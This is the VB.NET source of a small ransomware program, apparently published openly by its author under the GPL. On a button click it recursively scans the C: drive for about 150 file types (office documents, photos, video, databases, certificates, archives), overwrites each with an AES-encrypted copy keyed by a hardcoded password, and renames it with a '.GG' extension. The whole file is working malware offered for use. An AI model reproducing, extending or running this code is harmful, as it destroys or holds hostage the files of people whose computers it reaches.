'Coded by SadFud - 2016
'@Sadfud
'https://reversecodes.wordpress.com
'licensed under GNU-gpl v3

Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Public Shared Function BusarArchivos(ruta As String, mExtesiones As IEnumerable(Of String)) As IEnumerable(Of String)
        Return (From mArchivos In IO.Directory.GetFiles(ruta, "*", IO.SearchOption.AllDirectories) Where mExtesiones.Contains(IO.Path.GetExtension(mArchivos).ToLower())).ToList()
    End Function
    'rutina modificada a partir de una de Apex95
    Public Shared Sub RutinaDeCifrado(nombre As String, password As String)
        Dim key As Byte() = New Byte(31) {}
        Encoding.Default.GetBytes(password).CopyTo(key, 0)
        Dim aes As New RijndaelManaged() With
            {
                .Mode = CipherMode.CBC,
                .KeySize = 256,
                .BlockSize = 256,
                .Padding = PaddingMode.Zeros
            }
        Dim buffer As Byte() = File.ReadAllBytes(nombre)
        Using matrizStream As New MemoryStream
            Using cStream As New CryptoStream(matrizStream, aes.CreateEncryptor(key, key), CryptoStreamMode.Write)
                cStream.Write(buffer, 0, buffer.Length)
                Dim appendBuffer As Byte() = matrizStream.ToArray()
                Dim finalBuffer As Byte() = New Byte(appendBuffer.Length - 1) {}
                appendBuffer.CopyTo(finalBuffer, 0)
                File.WriteAllBytes(nombre, finalBuffer)

            End Using
        End Using
        File.Move(nombre, nombre & ".GG")
    End Sub
    Private Sub Empezar()
        Dim mExtesiones As IEnumerable(Of String) = {".3dm", ".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw", ".as", ".as3", ".asf", ".asp", ".asx", ".avi", ".bay", ".bmp", ".cdr", ".cer", ".class", ".cpp", ".cr2", ".crt", ".crw", ".cs", ".csv", ".db", ".dbf", ".dcr", ".der", ".dng", ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx", ".dwg", ".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff", ".indb", ".indd", ".indl", ".indt", ".inx", ".jar", ".java", ".jpeg", ".jpg", ".kdc", ".m3u", ".m3u8", ".m4u", ".max", ".mdb", ".mdf", ".mef", ".mid", ".mov", ".mp3", ".mp4", ".mpa", ".mpeg", ".mpg", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc", ".odm", ".odp", ".ods", ".odt", ".orf", ".p12", ".p7b", ".p7c", ".pdb", ".pdf", ".pef", ".pem", ".pfx", ".php", ".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx", ".ppt", ".pptm", ".pptx", ".prel", ".prproj", ".ps", ".psd", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".rar", ".raw", ".rb", ".rtf", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sql", ".sr2", ".srf", ".srw", ".svg", ".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps", ".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xls", ".xlsb", ".xlsm", ".xlsx", ".xlt", ".xltm", ".xltx", ".xlw", ".xml", ".xqx", ".zip"}
        Dim ruta As String = "C:\"
        For Each mArchivos As String In BusarArchivos(ruta, mExtesiones)
            RutinaDeCifrado(mArchivos, "SadFud@Indetectables(dot)net")
        Next
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Call Empezar()
    End Sub
End Class
